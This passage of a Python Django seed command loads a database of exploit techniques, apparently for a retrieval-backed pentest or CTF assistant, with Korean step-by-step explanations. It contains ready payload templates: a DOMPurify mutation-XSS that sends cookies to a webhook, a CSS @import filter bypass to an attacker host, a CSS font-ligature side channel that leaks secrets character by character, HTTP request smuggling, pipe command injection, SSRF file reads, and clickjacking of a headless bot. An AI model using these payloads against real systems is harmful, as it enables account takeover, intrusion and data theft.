                        "password = `password` = 1 은 (password = password) = 1 → 1 = 1 → true. "
                        "이 기법은 parameterized query를 사용해도 우회 가능하므로 "
                        "typeof 검증이나 입력 스키마 검증이 필수."
                    ),
                },
            ],
            "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs", "express"],
        },
    },
    {
        "name": "dompurify_mxss_custom_element_safe_for_templates",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "DOMPurify mXSS bypass via custom elements + SAFE_FOR_TEMPLATES config",
            "applies_when": (
                "DOMPurify가 SAFE_FOR_TEMPLATES: true 및 CUSTOM_ELEMENT_HANDLING "
                "(tagNameCheck: /^custom-/) 설정으로 사용되는 경우. "
                "sanitize된 HTML이 innerHTML에 할당될 때 DOM mutation으로 "
                "이벤트 핸들러가 살아남을 수 있음."
            ),
            "prerequisites": [
                "DOMPurify with SAFE_FOR_TEMPLATES: true",
                "CUSTOM_ELEMENT_HANDLING with tagNameCheck for custom- prefix",
                "sanitize 결과가 innerHTML에 할당됨",
                "CSP가 inline script/event handler를 허용 (unsafe-inline 등)",
            ],
            "technique_steps_md": (
                "1. DOMPurify 설정 확인: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`\n"
                "2. mutation XSS payload 구성: `<math>`, `<table>`, `<custom-*>` 태그를 조합하여 "
                "DOM 파싱 시 구조 변경을 유도\n"
                "3. `<style>` 태그 내부에 `<! \\${` 같은 template 구문으로 파서 혼동\n"
                "4. `<custom-b id=\">...\">` 같은 형태로 attribute 안에 event handler 삽입\n"
                "5. sanitize 후 innerHTML 할당 시 DOM reparse → `<img onerror=...>` 활성화\n"
                "6. XSS 실행: `location.href='...' + document.cookie`"
            ),
            "code_template": (
                '<math><custom-test><mi><li><table><custom-test><li></li></custom-test>'
                '<a><style><! \\${</style>}<custom-b id=">'
                "<img src onerror='location.href=`{webhook}/?token=`+document.cookie'>"
                '">test</custom-b></a></table></li></mi></custom-test></math>'
            ),
            "examples": [
                {
                    "params": {
                        "dompurify_config": "SAFE_FOR_TEMPLATES: true, CUSTOM_ELEMENT_HANDLING: {tagNameCheck: /^custom-/}",
                        "sink": "innerHTML assignment in admin page",
                        "delivery": "base64 encoded in URL query parameter",
                    },
                    "notes": (
                        "DOMPurify의 SAFE_FOR_TEMPLATES 모드에서 custom element 허용 시 "
                        "math/table 컨텍스트 전환과 style 태그를 결합한 mutation XSS가 가능. "
                        "서버 사이드에서 sanitize한 HTML을 클라이언트에서 innerHTML로 "
                        "다시 파싱하면 DOM 구조가 달라져 이벤트 핸들러가 활성화됨."
                    ),
                },
            ],
            "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        },
    },
    {
        "name": "csp_split_brain_admin_unsafe_inline",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSP split-brain — unsafe-inline on admin routes enables XSS execution",
            "applies_when": (
                "웹앱이 경로별로 다른 CSP 정책을 적용하고, admin 경로에 "
                "script-src 'unsafe-inline'이 설정된 경우. public 페이지에서는 "
                "nonce 기반 CSP로 XSS가 차단되지만, admin 페이지로 리다이렉트하면 실행 가능."
            ),
            "prerequisites": [
                "admin 경로: script-src 'self' 'unsafe-inline'",
                "public 경로: script-src 'nonce-...'",
                "admin 페이지에 사용자 입력을 반영하는 sink (innerHTML 등)이 존재",
                "사용자를 admin 페이지로 유도할 수 있는 방법 (form submit, redirect 등)",
            ],
            "technique_steps_md": (
                "1. CSP 헤더 분석: `req.path.startsWith('/admin')` → unsafe-inline\n"
                "2. public 페이지에서는 XSS payload가 CSP에 의해 차단됨을 확인\n"
                "3. admin 페이지에 사용자 입력을 받는 sink 찾기 (innerHTML, eval 등)\n"
                "4. public 페이지의 stored content에 admin 페이지로의 form/redirect 삽입\n"
                "5. 피해자(bot)가 admin 페이지를 방문하면 unsafe-inline CSP 하에서 XSS 실행"
            ),
            "code_template": (
                "// Express middleware CSP 설정 (취약 패턴)\n"
                "if (req.path.startsWith('/admin')) {\n"
                "  res.setHeader('CSP', \"script-src 'self' 'unsafe-inline'\");\n"
                "} else {\n"
                "  res.setHeader('CSP', `script-src 'nonce-${nonce}'`);\n"
                "}\n"
                "// admin 페이지에서 innerHTML = userInput → XSS 가능"
            ),
            "examples": [
                {
                    "params": {
                        "admin_csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'",
                        "public_csp": "default-src 'self'; script-src 'nonce-{random}'; base-uri 'none'",
                        "admin_sink": "/admin/page → atob(params) → fetch /admin/sanitize → innerHTML",
                    },
                },
            ],
            "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        },
    },
    {
        "name": "ejs_theme_path_traversal_css_injection",
        "vuln_type": "path_traversal",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EJS theme path traversal — CSS file include via ../ in theme parameter",
            "applies_when": (
                "EJS (또는 유사 템플릿)에서 사용자 제어 가능한 theme 값이 "
                "CSS 경로에 직접 삽입되는 경우. "
                "`<link href=\"/css/theme/<%= theme %>.css\">` 같은 패턴에서 "
                "`theme: \"../switch\"`로 다른 CSS 파일을 로드할 수 있음."
            ),
            "prerequisites": [
                "theme 파라미터가 DB에 저장되거나 URL에서 직접 반영",
                "서버 사이드 검증 없이 CSS 경로에 삽입",
                "로드할 수 있는 대체 CSS 파일이 존재 (static 디렉터리 내)",
            ],
            "technique_steps_md": (
                "1. 게시글 작성 시 theme 필드에 `../switch` 입력 (서버 검증 없음)\n"
                "2. 렌더링 시 `<link href=\"/css/theme/../switch.css\">` → `/css/switch.css` 로드\n"
                "3. switch.css의 `.slider` 클래스가 absolute positioning 제공\n"
                "4. 게시글 content에 `.slider` 클래스를 가진 submit 버튼 삽입\n"
                "5. 기존 UI 요소(#delete 등) 위에 오버레이 → 클릭 하이재킹"
            ),
            "code_template": (
                "requests.post('{url}/post/write', json={\n"
                "    'title': 'test',\n"
                "    'content': '<form action=\"/admin/test\">'\n"
                "              '<button type=\"submit\" class=\"slider\"></button>'\n"
                "              '</form>',\n"
                "    'theme': '../switch'\n"
                "}, cookies={'jwt': token})"
            ),
            "examples": [
                {
                    "params": {
                        "template": '<link rel="stylesheet" href="/css/theme/<%= post.theme %>.css">',
                        "payload_theme": "../switch",
                        "loaded_css": "/css/switch.css",
                        "css_effect": ".slider { position: absolute; width/height: 100% }",
                    },
                },
            ],
            "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress", "clickjacking"],
        },
    },
    {
        "name": "headless_bot_click_hijack_css_overlay",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Headless bot click hijacking via CSS absolute position overlay",
            "applies_when": (
                "CTF 또는 웹앱에서 headless browser (Puppeteer 등)가 특정 페이지를 방문하고 "
                "특정 요소(#delete 등)를 클릭하는 봇이 있을 때. "
                "사용자 제어 가능한 HTML/CSS로 클릭 대상 위에 다른 요소를 오버레이하여 "
                "봇의 클릭을 다른 동작(form submit 등)으로 하이재킹."
            ),
            "prerequisites": [
                "headless browser 봇이 페이지 방문 후 특정 요소 클릭",
                "사용자가 HTML content에 form/button 삽입 가능",
                "CSS로 absolute/fixed positioning 사용 가능 (theme traversal, inline style 등)",
                "봇이 인증된 세션(cookie)으로 방문",
            ],
            "technique_steps_md": (
                "1. 봇의 행동 분석: `page.$('#delete').click()` 등\n"
                "2. 사용자 content에 `<form action=\"/target\">` + `<button class=\"slider\">` 삽입\n"
                "3. CSS (.slider)가 position: absolute + width/height: 100%로 전체 영역 커버\n"
                "4. 봇이 #delete 클릭 시도 → 실제로는 .slider submit 버튼 클릭\n"
                "5. form이 인증된 세션으로 /target 페이지에 GET 요청 → 공격자 payload 전달"
            ),
            "code_template": (
                "<!-- Post content with clickjack overlay -->\n"
                "<form action=\"http://target/admin/test\">\n"
                "    <input type=\"hidden\" name=\"title\" value=\"{b64_title}\">\n"
                "    <input type=\"hidden\" name=\"content\" value=\"{b64_xss_payload}\">\n"
                "    <button type=\"submit\" class=\"slider\"></button>\n"
                "</form>\n"
                "<!-- theme: ../switch loads CSS with .slider { position: absolute } -->"
            ),
            "examples": [
                {
                    "params": {
                        "bot_action": "page.$('#delete').click()",
                        "overlay_css": ".slider { position: absolute; cursor: pointer; width: 100%; height: 100% }",
                        "redirect_target": "/admin/page?title=...&content=<b64_xss>",
                        "bot_cookie": "JWT with sensitive data in claims",
                    },
                },
            ],
            "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        },
    },
    # ── CSS side-channel techniques ──
    {
        "name": "css_import_escape_url_filter_bypass",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "import", "escape", "filter-bypass", "style-injection", "exfiltration"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS @import remote URL filter bypass via CSS escape sequences",
            "applies_when": (
                "클라이언트 JS가 <style> 블록 내 원격 URL(http://, //)을 탐지하여 차단하지만, "
                "CSS 이스케이프 시퀀스(\\3a = ':', \\2f = '/')를 사용하면 JS 정규식을 우회하면서 "
                "브라우저는 정상적으로 URL을 파싱하여 외부 리소스를 로드하는 경우."
            ),
            "prerequisites": [
                "게시글 등에 <style> 태그 삽입 가능",
                "클라이언트 JS가 CSS 내 원격 URL을 정규식으로 필터링",
                "서버 사이드에서 <style> 태그 자체는 허용 (DOMPurify에서 제거하지 않거나 별도 처리)",
            ],
            "technique_steps_md": (
                "1. JS 필터 분석: `/\\b(?:https?|data)\\s*:/i.test(css)` 또는 `css.includes('//')`\n"
                "2. CSS 이스케이프로 우회: `http\\3a \\2f \\2f attacker\\2f style.css`\n"
                "3. `@import` 규칙으로 외부 CSS 로드: `<style>@import 'http\\3a \\2f \\2f ...';</style>`\n"
                "4. 브라우저가 이스케이프를 디코딩하여 정상 URL로 요청"
            ),
            "code_template": (
                "def css_escape_url(url):\n"
                "    return (url.replace(':', '\\\\3a ')\n"
                "               .replace('/', '\\\\2f ')\n"
                "               .replace('?', '\\\\3f ')\n"
                "               .replace('=', '\\\\3d ')\n"
                "               .replace('&', '\\\\26 '))\n"
                "\n"
                "payload = f\"<style>@import '{css_escape_url(collector_url)}';</style>\""
            ),
            "examples": [{
                "params": {
                    "filter_regex": "/\\b(?:https?|data)\\s*:/i.test(css) || css.includes('//')",
                    "bypass": "http\\3a \\2f \\2f attacker:18800\\2f style.css",
                    "max_payload_len": 320,
                },
            }],
            "tags": ["css", "import", "escape", "filter-bypass", "style-injection"],
        },
    },
    {
        "name": "firefox_content_visibility_hidden_layout_bug",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug", "defense-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Firefox content-visibility:hidden bug — checkVisibility()=false but layout still works",
            "applies_when": (
                "웹앱이 JavaScript로 `element.checkVisibility()`를 사용하여 "
                "CSS로 표시된 요소를 감지하고 제거하는 방어를 구현한 경우. "
                "Firefox ESR 140.0의 버그로 `content-visibility:hidden`이 적용되면 "
                "`checkVisibility()`는 false를 반환하지만(방어 우회), "
                "내부 flex/grid layout, 폰트 로딩, container query, background-image 로딩은 "
                "정상 동작하여 CSS-only 공격이 가능."
            ),
            "prerequisites": [
                "Firefox ESR 140.0 (또는 해당 버그가 있는 버전)",
                "JS 방어가 checkVisibility()에 의존",
                "공격자가 CSS를 통해 content-visibility:hidden 설정 가능",
                "내부 레이아웃이나 리소스 로딩을 통한 side-channel 필요",
            ],
            "technique_steps_md": (
                "1. JS 방어 분석: `f.checkVisibility()` → true이면 `f.remove()`\n"
                "2. CSS 주입: `#page { content-visibility: hidden !important; }`\n"
                "3. `checkVisibility()` → false 반환 (방어 우회)\n"
                "4. Firefox 버그: 내부 layout은 여전히 동작\n"
                "5. flex layout + font ligature + container query로 side-channel 실행\n"
                "6. 참고: https://bugzilla.mozilla.org/show_bug.cgi?id=2025174"
            ),
            "code_template": (
                "#page {\n"
                "  content-visibility: hidden !important;\n"
                "  display: flex !important;\n"
                "  /* 내부 layout은 Firefox 버그로 여전히 동작 */\n"
                "}\n"
                "#flag {\n"
                "  display: block !important;\n"
                "  /* checkVisibility()=false이므로 JS가 제거하지 않음 */\n"
                "}"
            ),
            "examples": [{
                "params": {
                    "browser": "Firefox ESR 140.0 (headless)",
                    "bug_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2025174",
                    "defense": "setInterval(check, 50) + MutationObserver — checkVisibility() 기반",
                    "bypassed_checks": ["display !== none", "checkVisibility() === true"],
                },
            }],
            "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug"],
        },
    },
    {
        "name": "css_font_ligature_width_side_channel",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS font ligature width side-channel — character-by-character data exfiltration",
            "applies_when": (
                "비밀 텍스트가 DOM에 존재하고, 공격자가 CSS를 주입하여 해당 요소에 "
                "커스텀 폰트를 적용할 수 있는 경우. JavaScript 실행 없이 CSS만으로 "
                "텍스트 내용을 한 글자씩 외부로 유출할 수 있음."
            ),
            "prerequisites": [
                "비밀 텍스트가 DOM 요소에 존재 (예: flag div)",
                "CSS 주입 가능 (style 태그 또는 @import)",
                "브라우저가 외부 폰트 로딩 + container query 지원",
                "외부 collector 서버 필요 (폰트/CSS 제공 + hit 수집)",
            ],
            "technique_steps_md": (
                "1. **커스텀 폰트 생성**: fonttools로 ligature 폰트 빌드\n"
                "   - 이미 알려진 prefix + 각 후보 문자 → 서로 다른 폭의 glyph로 매핑\n"
                "   - 예: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...\n"
                "2. **CSS 레이아웃 구성**: flex container + container query\n"
                "   - `#page` = flex row, 고정 width\n"
                "   - `#flag` = flex: 0 0 auto (텍스트 폭만큼 차지)\n"
                "   - `.spacer` = flex: 1 1 auto + container-type: size (남는 공간)\n"
                "3. **Container Query oracle**: spacer 폭에 따라 다른 background-image URL\n"
                "   - `@container (width: Npx) { .spacer::before { background-image: url(.../hit?c=X); } }`\n"
                "4. **한 글자 유출**: 브라우저가 조건에 맞는 URL만 로드 → collector에 문자 전달\n"
                "5. **반복**: prefix 업데이트 → 새 폰트/CSS 생성 → 다음 글자 유출"
            ),
            "code_template": (
                "# Font 생성 (fonttools)\n"
                "fb = FontBuilder(1000, isTTF=True)\n"
                "# 각 후보 문자에 대해 다른 폭의 ligature glyph 생성\n"
                "for i, ch in enumerate(candidates):\n"
                "    metrics[lig_name(i)] = (i + 1, 0)  # 폭 = index+1\n"
                "# OpenType feature: sub prefix_glyphs candidate_glyph by lig_glyph\n"
                "fea = 'sub ' + ' '.join(glyph_name(c) for c in prefix) + ' ' + glyph_name(ch) + ' by ' + lig_name(i)\n"
                "\n"
                "# CSS: @font-face + flex layout + container query\n"
                "# @container (width: Npx) { background-image: url(collector/hit?c=X); }"
            ),
            "examples": [{
                "params": {
                    "flag_element": '<div id="flag">{{ flag }}</div>',
                    "font_lib": "fonttools (Python)",
                    "exfil_method": "container query → background-image URL per character",
                    "chars_per_iteration": 1,
                    "total_iterations": "flag_length - prefix_length",
                    "success_rate": "~80% per attempt, 5 retries",
                },
                "notes": (
                    "Firefox ESR에서 content-visibility:hidden 버그와 결합. "
                    "JS 방어(checkVisibility)를 우회하면서 font ligature side-channel 실행. "
                    "로컬 검증에서 5글자 연속 유출 성공."
                ),
            }],
            "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query", "fonttools"],
        },
    },
    # ── HTTP smuggling / protocol confusion techniques ──
    {
        "name": "safe_strlen_content_length_desync",
        "vuln_type": "http_request_smuggling",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["smuggling", "content-length", "desync", "php", "control-char"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_strlen Content-Length desync — HTTP request smuggling via control character truncation",
            "applies_when": (
                "PHP 앱에서 Content-Length를 직접 계산하되 ctype_cntrl($c) → 즉시 return하는 "
                "safe_strlen 류 함수를 사용. 실제 body 길이와 safe_strlen 결과가 불일치하면 "
                "backend에 second request를 smuggle할 수 있다."
            ),
            "prerequisites": [
                "PHP safe_strlen: for-loop + ctype_cntrl → return $len (control char에서 조기 종료)",
                "PHP가 curl로 backend에 request를 forward — keep-alive connection",
                "backend (Node.js 등)가 실제 Content-Length 기준으로 body를 읽어 남는 bytes가 다음 request",
            ],
            "technique_steps_md": (
                "1. `safe_strlen` 분석 — control char (\\x00-\\x1f) 첫 등장에서 길이를 잘라내는지 확인\n"
                "2. 실제 body 구성: `VISIBLE_PART + \\r + SMUGGLED_HTTP_REQUEST`\n"
                "   → safe_strlen은 `len(VISIBLE_PART)` 반환, 실제 전송은 전체 길이\n"
                "3. PHP가 `Content-Length: safe_strlen(body)` 로 backend에 POST 전송 (keep-alive)\n"
                "4. backend는 VISIBLE_PART 만 첫 request body로 읽고, \n"
                "   남은 `\\r + SMUGGLED_HTTP_REQUEST`를 새 request로 파싱\n"
                "5. smuggled request에 원하는 endpoint/header/body를 넣어 임의 동작 수행"
            ),
            "code_template": (
                "visible = b'action=healthcheck'\n"
                "smuggled = (\n"
                "    b'\\r\\n'\n"
                "    b'POST /set/{key}/{value} HTTP/1.1\\r\\n'\n"
                "    b'X-Auth: {auth_header}\\r\\n'\n"
                "    b'Content-Length: 0\\r\\n'\n"
                "    b'\\r\\n'\n"
                ")\n"
                "body = visible + b'\\r' + smuggled  # \\r triggers safe_strlen cutoff\n"
                "# PHP sees Content-Length: len(visible), backend gets both requests"
            ),
            "examples": [{
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d) or any ctype_cntrl char",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value",
                },
                "notes": (
                    "input sanitization이 없는 경우 smuggling 없이도 풀 수 있지만, "
                    "danger() 류 필터가 있으면 CL desync가 필수."
                ),
            }, {
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d)",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value — input filter bypass",
                },
                "notes": (
                    "danger() 류 함수가 pipe(|)/null/newline을 필터하므로 "
                    "직접 URL에 command injection 불가 → CL desync로 우회."
                ),
            }],
            "tags": ["smuggling", "content-length", "desync", "php", "safe_strlen", "control-char", "keep-alive"],
        },
    },
    {
        "name": "memstorage_pipe_newline_command_injection",
        "vuln_type": "command_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol", "injection", "pipe", "newline", "tcp", "memstorage"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Memstorage pipe/newline command injection — multi-command execution via delimiter in user input",
            "applies_when": (
                "TCP 기반 custom protocol 서버의 parseCommand가 `|` 또는 `\\n`으로 "
                "input을 split하고, HTTP endpoint에서 받은 user input이 그대로 "
                "protocol stream에 포함되는 경우. key/value 파라미터에 `|CMD arg`를 주입하면 "
                "임의 protocol command 실행."
            ),
            "prerequisites": [
                "TCP custom protocol: parseCommand가 input.split(/\\n|\\|/) 로 명령어 분리",
                "HTTP→TCP bridge: Express 등이 URL param을 memstorage protocol로 전달",
                "사용자 입력에 대한 pipe/newline sanitization 없음 (또는 우회 가능)",
            ],
            "technique_steps_md": (
                "1. memstorage.js parseCommand 분석 — split delimiter 확인 (`/\\n|\\|/`)\n"
                "2. VALID_CMDS 목록에서 유용한 command 식별 (AUTH, AUTH_S, GET, SET, BYE 등)\n"
                "3. HTTP endpoint (e.g. `/get/:key`)를 통해 key에 pipe 주입:\n"
                "   `GET /get/test|AUTH_S <hex_creds> <hex_payload>|BYE`\n"
                "4. Express가 memstorage TCP에 `GET test|AUTH_S ... |BYE` 전송\n"
                "5. parseCommand가 pipe에서 split → 3개 명령어 (GET, AUTH_S, BYE) 순차 실행\n"
                "6. AUTH_S 결과로 Visit=> 패턴이 response에 포함되면 SSRF chain 발동"
            ),
            "code_template": (
                "import urllib.parse\n"
                "# hex-encode the Visit=>file:///flag.txt payload\n"
                "visit_hex = 'file:///flag.txt'.encode().hex()\n"
                "crlf_hex = '0d0a0d0a'  # \\r\\n\\r\\n in hex\n"
                "injected_key = f'test|AUTH_S {crlf_hex} {visit_hex}|BYE'\n"
                "url = f'http://target/get/{urllib.parse.quote(injected_key, safe=\"\")}'"
            ),
            "examples": [{
                "params": {
                    "delimiter": "pipe (|)",
                    "injected_via": "/get/:key URL parameter",
                    "auth_cmd": "AUTH_S <hex_id> <hex_pw_or_payload>",
                },
                "notes": (
                    "input filter가 없으면 직접 pipe injection 가능. "
                    "AUTH_S hex 디코딩 결과에 Visit=> payload 포함."
                ),
            }],
            "tags": ["command-injection", "pipe", "newline", "protocol", "memstorage", "tcp", "parseCommand"],
        },
    },
    {
        "name": "visit_redirect_ssrf_chain",
        "vuln_type": "ssrf",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "redirect", "visit", "file-read", "chain"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Visit=> response-driven SSRF chain — secondary request via response body pattern",
            "applies_when": (
                "debug_Get/api_Get 류 함수가 첫 번째 HTTP response body에서 "
                "'Visit=>URL' 패턴을 찾으면 URL을 추출하여 두 번째 요청(api_Get)을 보내는 경우. "
                "첫 번째 response에 Visit=>file:///flag.txt를 삽입하면 LFI 달성."
            ),
            "prerequisites": [
                "PHP debug_Get: response에서 strpos('Visit=>') → explode → api_Get(next_url)",
                "api_Get이 curl을 사용하여 file:// scheme 지원",
                "첫 번째 response body에 Visit=>payload를 삽입할 수 있는 injection point",
            ],
            "technique_steps_md": (
                "1. debug_Get 함수 분석:\n"
                "   ```php\n"
                "   function debug_Get($url) {\n"
                "       $response = file_get_contents($url);\n"
                "       if(strpos($response, 'Visit=>') !== FALSE) {\n"
                "           $next_url = explode('Visit=>', $response)[1];\n"
                "           return api_Get($next_url);\n"
                "       }\n"
                "       return $response;\n"
                "   }\n"
                "   ```\n"
                "2. api_Get은 curl 기반 — file:// schema 지원 확인\n"
                "3. 첫 번째 request의 response에 `Visit=>file:///flag.txt` 문자열을 삽입\n"
                "   (e.g. memstorage AUTH_S 에러메시지에 hex-decoded payload 포함)\n"
                "4. debug_Get이 `file:///flag.txt`를 추출 → api_Get(file:///flag.txt) → 플래그 반환"
            ),
            "code_template": (
                "# Craft a URL that will make the server return Visit=>file:///flag.txt\n"
                "visit_payload = 'Visit=>file:///flag.txt'\n"
                "# Inject via memstorage AUTH_S hex encoding:\n"
                "visit_hex = visit_payload.encode().hex()\n"
                "# AUTH_S will echo hex-decoded content in error response\n"
                "debug_url = f'http://api:9090/get/test|AUTH_S 0d0a0d0a {visit_hex}|BYE'\n"
                "# Call debug action:\n"
                "requests.get(f'{base}/memstorage.php', params={'action':'debug','url':debug_url})"
            ),
            "examples": [{
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "AUTH_S의 hex-decoded error response에 Visit=>file:///flag.txt가 포함되어 "
                    "debug_Get이 file:///flag.txt를 curl로 읽어 flag 반환."
                ),
            }, {
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "fsockopen으로 memstorage에서 Visit=> 응답 확인 가능하나, "
                    "PHP 8.2+ file_get_contents HTTP parser가 raw TCP 응답을 거부할 수 있음."
                ),
            }],
            "tags": ["ssrf", "visit", "redirect", "file-read", "lfi", "curl", "chain", "debug_Get"],
        },
    },
    {
        "name": "http_to_tcp_protocol_confusion",
        "vuln_type": "protocol_confusion",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol-confusion", "http", "tcp", "ssrf", "file_get_contents"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "HTTP-to-TCP protocol confusion — file_get_contents(http://) to raw TCP service",
            "applies_when": (
                "PHP의 file_get_contents('http://host:port/path')가 raw TCP 서비스 (non-HTTP)에 "
                "연결될 때, HTTP request line과 headers가 TCP protocol의 명령어로 해석되는 경우. "
                "GET /path HTTP/1.0 자체가 custom protocol의 입력이 됨."
            ),
            "prerequisites": [
                "PHP file_get_contents + http:// stream wrapper 사용",
                "target이 raw TCP 서비스 (e.g. memstorage on port 9091)",
                "TCP 서비스의 parseCommand가 HTTP request line을 (부분적으로) 처리",
                "PHP version에 따라 raw TCP response를 HTTP로 parse하는 strict level이 다름",
            ],
            "technique_steps_md": (
                "1. debug action이 `http://api:9091/` URL을 file_get_contents로 요청하도록 유도\n"
                "2. PHP가 보내는 실제 데이터:\n"
                "   ```\n"
                "   GET /CMD1|CMD2|CMD3 HTTP/1.0\\r\\n\n"
                "   Host: api:9091\\r\\n\n"
                "   \\r\\n\n"
                "   ```\n"
                "3. memstorage parseCommand가 이 중 `GET /CMD1|CMD2|CMD3` 부분을 split:\n"
                "   - `GET /CMD1` (invalid → skip)\n"
                "   - `CMD2` (valid command 실행)\n"
                "   - `CMD3` (valid command 실행)\n"
                "4. 단, PHP의 HTTP stream wrapper가 응답의 첫 줄을 HTTP status line으로 기대 —\n"
                "   raw TCP 응답은 보통 실패. PHP 버전에 따라 ignore_errors로 우회 가능할 수도 있음.\n"
                "5. 우회 전략: PHP가 fsockopen으로 직접 TCP 통신하거나, \n"
                "   memstorage 응답의 첫 줄을 HTTP/1.x 형태로 만드는 trick."
            ),
            "code_template": (
                "# PHP debug action에 raw TCP service URL 전달\n"
                "import urllib.parse\n"
                "cmd_payload = 'AUTH_S 0d0a0d0a ' + 'file:///flag.txt'.encode().hex() + '|BYE'\n"
                "debug_url = f'http://api:9091/{urllib.parse.quote(cmd_payload, safe=\"\")}'\n"
                "# memstorage.php?action=debug&url=<debug_url>\n"
                "# PHP sends: GET /<cmd_payload> HTTP/1.0\\r\\nHost: api:9091\\r\\n\\r\\n\n"
                "# memstorage splits on | and executes AUTH_S and BYE"
            ),
            "examples": [{
                "params": {
                    "php_function": "file_get_contents with http:// wrapper",
                    "target_service": "custom TCP service on non-HTTP port",
                    "http_request_as_command": "GET /payload HTTP/1.0 → parseCommand splits on |",
                },
                "notes": (
                    "PHP 8.2+에서 file_get_contents가 raw TCP 응답을 "
                    "HTTP header로 parse하려 하여 실패할 수 있음. fsockopen 직접 TCP는 성공. "
                    "PHP 버전에 따라 file_get_contents로도 동작 가능."
                ),
            }],
            "tags": ["protocol-confusion", "http-to-tcp", "file_get_contents", "ssrf", "memstorage", "raw-tcp"],
        },
    },
]


class Command(BaseCommand):
    help = "Seed exploit techniques (transferable tricks, kind='exploit_technique')"

    def add_arguments(self, parser):
        parser.add_argument(
            "--reset", action="store_true",
            help="기존 source='technique' 모두 삭제 후 재시드",
        )

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            deleted = PayloadPattern.objects.filter(source="technique").delete()
            self.stdout.write(self.style.WARNING(f"reset: deleted {deleted}"))

        created_cnt = 0
        updated_cnt = 0
        for t in TECHNIQUES:
            obj, created = PayloadPattern.objects.update_or_create(
                name=t["name"],
                source="technique",
                defaults={
                    "vuln_type": t["vuln_type"],
                    "category": t.get("category", "exploitation"),
                    "safety_level": t.get("safety_level", "safe"),
                    "request_template": "",  # technique은 단일 payload 아님
                    "matcher": None,
                    "safety_notes": t["attack_metadata"].get("applies_when", "")[:500],
                    "tags": t.get("tags", []),
                    "attack_metadata": t["attack_metadata"],
                    "is_active": True,
                },
            )
            self.stdout.write(
                f"  technique {'+' if created else '='} {t['name']:40s} ({t['vuln_type']})"
            )
            if created:
                created_cnt += 1
            else:
                updated_cnt += 1

        self.stdout.write(self.style.SUCCESS(
            f"\ntechniques: +{created_cnt} created, ={updated_cnt} updated"
        ))

        # 임베딩 — search_knowledge / retrieve_similar_patterns 가 hit
        if embeddings_available():
            from api.embedding_service import pattern_text
            targets = list(PayloadPattern.objects.filter(source="technique"))
            texts = []
            for p in targets:
                # technique은 attack_metadata 본문이 더 풍부 — 그것 위주로 임베딩
                meta = p.attack_metadata or {}
                parts = [
                    f"name: {meta.get('name', p.name)}",
                    f"vuln_type: {p.vuln_type}",
                    f"applies_when: {meta.get('applies_when', '')}",
                    f"prerequisites: {' / '.join(meta.get('prerequisites') or [])}",
                    f"steps: {meta.get('technique_steps_md', '')[:500]}",
                    f"tags: {', '.join(meta.get('tags') or p.tags or [])}",
                ]
                texts.append("\n".join(parts))
            self.stdout.write(f"embedding {len(texts)} techniques via {EMBEDDING_MODEL} ...")
            vectors = embed_documents(texts)
            if vectors:
                for p, vec in zip(targets, vectors):
                    p.embedding = vec
                    p.embedding_model = EMBEDDING_MODEL
                    p.save(update_fields=["embedding", "embedding_model"])
                self.stdout.write(self.style.SUCCESS(
                    f"embeddings saved for {len(vectors)} techniques"
                ))
            else:
                self.stdout.write(self.style.WARNING("임베딩 생성 실패 — 건너뜀"))
        else:
            self.stdout.write(self.style.WARNING(
                "Voyage 임베딩 비활성: VOYAGE_API_KEY 미설정 — semantic 검색 빈 결과"
            ))
